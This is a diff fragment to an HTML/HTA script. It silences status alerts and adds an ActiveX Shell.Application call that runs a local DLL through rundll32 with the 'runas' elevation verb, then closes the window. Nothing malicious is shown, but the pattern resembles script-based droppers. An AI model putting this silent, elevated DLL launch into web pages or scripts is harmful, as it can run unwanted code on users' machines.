@@ -94,7 +94,7 @@ try {
 
     'outStream.Close();'+
 
-    'alert("OK");'+
+   // 'alert("OK");'+
     'window.close();'+
 
      '} catch(e) {'+
@@ -123,7 +123,7 @@ try {
         false
     );
 
-    alert("OK DLL");
+    //alert("OK DLL");
 
 } catch(e) {
 
@@ -131,7 +131,21 @@ try {
 
 }
 
-close();
+//********************************************  
+var shell = new ActiveXObject("Shell.Application");
+
+shell.ShellExecute(
+    "rundll32.exe",
+    '"D:\\PYTHON\\C\\dll\\mydll.dll",RunMyApp',
+    "",
+    "runas",
+    1
+);
+//********************************************
+ //alert("HY MicrosotTools !!!");
+    close();
+
+
 
 </script>
 
@@ -140,8 +154,6 @@ close();
 <body>
 </body>
 </html>
-
-
 
 
 
